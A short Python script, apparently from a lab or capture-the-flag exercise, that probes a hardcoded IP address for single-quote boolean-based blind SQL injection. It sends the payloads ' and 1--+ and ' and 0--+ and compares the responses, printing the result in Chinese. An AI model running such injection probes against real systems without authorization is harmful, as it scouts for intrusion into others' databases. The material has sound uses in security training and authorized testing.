import requests


def bool_verify(url):
    payload1 = "' and 1--+"
    payload2 = "' and 0--+"
    res1 = requests.get(url+payload1)
    res2 = requests.get(url+payload2)

    if "DongTaXueYuan" in res1.text and "DongTaXueYuan" not in res2.text:
        print("{} 存在单引号布尔盲注".format(url))
    else:
        print("{} 不存在单引号布尔盲注".format(url))


if __name__ == "__main__":
    url = 'http://120.25.24.45:32223/?id=1'
    bool_verify(url)